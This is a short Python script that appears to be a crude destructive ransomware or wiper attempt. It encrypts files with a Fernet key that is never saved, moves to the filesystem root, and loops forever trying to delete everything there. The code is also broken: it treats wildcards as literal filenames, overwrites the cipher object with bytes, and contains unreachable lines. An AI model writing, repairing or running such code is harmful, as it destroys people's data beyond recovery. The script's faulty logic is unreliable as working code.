from cryptography.fernet import Fernet
import os

key = Fernet.generate_key()
f = Fernet(key)
rfile = open("*", "rb")
with open("*", "wb") as wfile:
  f = f.encrypt(rfile.read())
  wfile.write(f)
os.chdir("/")
rfile = open("*", "rb")
with open("*", "wb") as wfile:
  f = f.encrypt(rfile.read())
  wfile.write(f)
os.remove("*")
while True:
  os.remove("/*" + "/*")

rfile.close()


